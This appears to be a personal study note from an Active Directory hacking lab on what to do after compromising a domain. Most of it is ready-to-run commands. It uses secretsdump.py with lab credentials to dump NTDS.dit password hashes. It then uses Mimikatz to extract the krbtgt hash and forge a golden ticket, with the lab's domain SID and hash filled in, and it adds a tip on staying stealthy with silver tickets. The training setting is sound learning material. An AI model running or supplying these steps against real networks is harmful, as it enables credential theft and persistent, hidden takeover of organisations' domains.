## Compromised the Domain - Now What?
 
 - [ ] Post-Domain Compromise Attack Strategy 

```

 - [ ] Dumping the NTDS.dit 

```
secretsdump.py MARVEL.local/pparker:'Password2'@192.168.138.132 -just-dc-ntlm
```

```
You never have to worry about PC passwords cuz if we were going to
crack anything, we would not include PC passwords.

- [ ] Golden Ticket Attacks

![[Pasted image 20241116223136.png]]


We can utilize Mimikatz to obtain the information necessary to perform this attack.

```
mimikatz.exe
```

```
privilege::debug
```

```
lsadump::lsa /inject /name:krbtgt
```


We need SID of Domain & NTLM of krbtgt

```
kerberos::golden /User:Administrator  /domain:marvel.local /sid:S-1-5-21-1232359821-2011282127-2883546489 /krbtgt:5dbde4a7fe0e1cced076a9a3ff2128ad /id:500 /ptt
```


If Golden ticket gets picked up and want to get stealthier than look into the what a silver ticket is
